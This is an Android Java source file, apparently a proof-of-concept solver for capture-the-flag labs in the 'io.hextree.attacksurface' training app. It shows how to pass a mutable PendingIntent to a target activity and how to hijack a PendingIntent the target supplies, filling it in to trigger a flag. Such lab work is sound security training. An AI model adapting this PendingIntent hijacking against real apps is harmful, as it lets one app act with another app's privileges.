package com.bedo.poc_app;

import static android.app.PendingIntent.FLAG_MUTABLE;
import static android.app.PendingIntent.FLAG_UPDATE_CURRENT;

import android.app.PendingIntent;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class Pending_Intent_Labs extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_pending_intent_labs);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });





        ReceiveFlag22();
        HijackFlag23();
    }

    public void Flag22(View view) {
        Intent BackAgain = new Intent(this, Pending_Intent_Labs.class);

            PendingIntent pi =   PendingIntent.getActivity(
                    this,
                    1,
                    BackAgain,
                    FLAG_MUTABLE|FLAG_UPDATE_CURRENT
            );

        Intent sendData = new Intent();
        sendData.setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag22Activity"
        );
        sendData.putExtra("PENDING",pi);
        startActivity(sendData);



    }
    private void ReceiveFlag22(){
        if (getIntent().hasExtra("flag")){
            String flag = getIntent().getStringExtra("flag");
            Toast.makeText(this,"PendingIntentFlag: "+flag,Toast.LENGTH_LONG).show();

            Log.d("PendingIntentFlag: ",flag);
        }else
            Log.d("Extra: ","No Extra received");
    }

    private void HijackFlag23(){

        Intent HijackIntent = getIntent();
        PendingIntent pi = HijackIntent.getParcelableExtra("pending_intent");
        if(pi !=null){
            Intent update = new Intent("io.hextree.attacksurface.GIVE_FLAG")
                    .putExtra("code",42);
            try {
                pi.send(this,1,update);
            } catch (PendingIntent.CanceledException e) {
                throw new RuntimeException(e);
            }
        }
    }

}